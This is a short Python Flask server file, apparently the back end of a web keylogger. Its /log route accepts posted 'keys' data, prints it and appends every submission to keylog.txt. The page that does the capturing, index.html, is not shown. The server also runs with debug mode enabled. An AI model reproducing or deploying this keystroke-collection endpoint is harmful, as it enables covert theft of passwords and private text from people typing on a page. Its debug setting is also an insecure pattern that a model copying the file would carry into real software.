# server.py
from flask import Flask, send_file, request, jsonify, render_template
import os

app = Flask(__name__)

@app.route('/favicon.ico')
def favicon():
    return send_file('favicon.ico', mimetype='image/x-icon')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/log', methods=['POST'])
def log_keys():
    data = request.json
    print("Received keys:", data['keys'])  # Debug print
    with open('keylog.txt', 'a') as f:
        f.write(data['keys'] + '\n')
    print("Logged to file")  # Debug print
    return jsonify({"status": "logged"})

if __name__ == '__main__':
    app.run(debug=True, port=3000)